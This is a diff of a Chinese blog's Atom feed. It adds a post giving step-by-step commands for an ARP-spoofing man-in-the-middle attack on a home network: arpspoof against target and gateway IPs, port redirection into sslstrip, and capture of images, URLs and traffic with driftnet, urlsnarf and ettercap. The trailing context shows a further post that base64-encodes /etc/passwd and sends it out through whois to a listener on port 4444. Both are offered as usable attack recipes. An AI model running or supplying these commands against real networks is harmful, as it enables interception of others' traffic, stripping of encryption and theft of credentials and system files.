@@ -1,4 +1,69 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://firsh.me/" rel="alternate" type="text/html" /><updated>2019-09-05T17:05:07+08:00</updated><id>https://firsh.me/feed.xml</id><title type="html">张建新</title><subtitle>张建新个人博客,我没有生来天赋过人,只有对技术的虔诚。</subtitle><author><name>ZhangJianXin</name></author><entry><title type="html">Arp 欺骗获取设备信息</title><link href="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/" rel="alternate" type="text/html" title="Arp 欺骗获取设备信息" /><published>2019-09-05T17:00:57+08:00</published><updated>2019-09-05T17:00:57+08:00</updated><id>https://firsh.me/2019/09/05/arp-dniff-url-sslniff</id><content type="html" xml:base="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/">&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">转载请注明出处，本文采用 CC4.0 协议授权</summary></entry><entry><title type="html">利用Whois传输小文件。</title><link href="https://firsh.me/2019/09/02/use-whois-send-file-hack/" rel="alternate" type="text/html" title="利用Whois传输小文件。" /><published>2019-09-02T10:03:13+08:00</published><updated>2019-09-02T10:03:13+08:00</updated><id>https://firsh.me/2019/09/02/use-whois-send-file-hack</id><content type="html" xml:base="https://firsh.me/2019/09/02/use-whois-send-file-hack/">&lt;p&gt;Linux利用Whois传输文件。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://firsh.me/" rel="alternate" type="text/html" /><updated>2019-09-05T17:10:22+08:00</updated><id>https://firsh.me/feed.xml</id><title type="html">张建新</title><subtitle>张建新个人博客,我没有生来天赋过人,只有对技术的虔诚。</subtitle><author><name>ZhangJianXin</name></author><entry><title type="html">Arp 欺骗获取设备信息</title><link href="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/" rel="alternate" type="text/html" title="Arp 欺骗获取设备信息" /><published>2019-09-05T17:00:57+08:00</published><updated>2019-09-05T17:00:57+08:00</updated><id>https://firsh.me/2019/09/05/arp-dniff-url-sslniff</id><content type="html" xml:base="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/">&lt;p&gt;家庭路由器中间人攻击以及数据获取。&lt;/p&gt;
+
+&lt;h2 id=&quot;arp过程介绍&quot;&gt;Arp过程介绍&lt;/h2&gt;
+
+&lt;h3 id=&quot;linux&quot;&gt;Linux&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 开启端口转发&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/proc/sys/net/ipv4/ip_forward
+&lt;span class=&quot;c&quot;&gt;# 监控图片&lt;/span&gt;
+driftnet &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; ~/Desktop/pic &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+driftnet &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0
+&lt;span class=&quot;c&quot;&gt;# 监控 URL&lt;/span&gt;
+urlsnarf &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0
+&lt;span class=&quot;c&quot;&gt;# 通过iptables 转发&lt;/span&gt;
+
+iptables &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--destination-port&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-port&lt;/span&gt; &amp;lt;yourListenPort&amp;gt;
+
+&lt;span class=&quot;c&quot;&gt;# 欺骗目标机器&lt;/span&gt;
+arpspoof  &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 192.168.2.165 192.168.2.1
+&lt;span class=&quot;c&quot;&gt;# 欺骗网关&lt;/span&gt;
+arpspoof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0  &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 192.168.2.1 192.168.2.150
+
+&lt;span class=&quot;c&quot;&gt;# 过滤欺骗&lt;/span&gt;
+arpspoof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; own &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 192.168.2.213 192.168.2.1 
+
+&lt;span class=&quot;c&quot;&gt;## sslstrip -l  &amp;lt;yourListenPort&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#负责截获数据 &lt;/span&gt;
+sslstrip 
+&lt;span class=&quot;c&quot;&gt;## 开启抓包工具&lt;/span&gt;
+wirewhark 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;mac&quot;&gt;mac&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rdr pass on en0 proto tcp from any to any port 80 -&amp;gt; 127.0.0.1 port 8080
+
+sslstrip &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 8080 
+
+&lt;span class=&quot;c&quot;&gt;# 修改 /etc/pf.conf 文件，在适当的位置加入&lt;/span&gt;
+rdr-anchor &lt;span class=&quot;s2&quot;&gt;&quot;http-forwarding&quot;&lt;/span&gt;
+
+load anchor &lt;span class=&quot;s2&quot;&gt;&quot;http-forwarding&quot;&lt;/span&gt; from &lt;span class=&quot;s2&quot;&gt;&quot;/etc/pf.anchors/http&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 重启 packet filter，依次输入命令 sudo pfctl -ef /etc/pf.conf 和 sudo pfctl -E&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 转发 sudo sysctl -w net.inet.ip.forwarding=1&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 查看转发情况 sudo sysctl -a | grep forward&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# arpspoof -i en0 -t (目标IP) (网关IP)&lt;/span&gt;
+arpspoof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en0 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10.196.17.58 10.196.17.1
+
+arpspoof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en0 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10.196.17.1 10.196.17.24
+
+&lt;span class=&quot;c&quot;&gt;# 截获流量 &lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ettercap &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 选择target1&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 网关 欺骗 dsniff -i eth0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;filter&quot;&gt;filter&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip.src&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;192.168.2.213 and http
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">家庭路由器中间人攻击以及数据获取。</summary></entry><entry><title type="html">利用Whois传输小文件。</title><link href="https://firsh.me/2019/09/02/use-whois-send-file-hack/" rel="alternate" type="text/html" title="利用Whois传输小文件。" /><published>2019-09-02T10:03:13+08:00</published><updated>2019-09-02T10:03:13+08:00</updated><id>https://firsh.me/2019/09/02/use-whois-send-file-hack</id><content type="html" xml:base="https://firsh.me/2019/09/02/use-whois-send-file-hack/">&lt;p&gt;Linux利用Whois传输文件。&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;传输机：
 root@john:~# whois &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4444 &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | base64&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
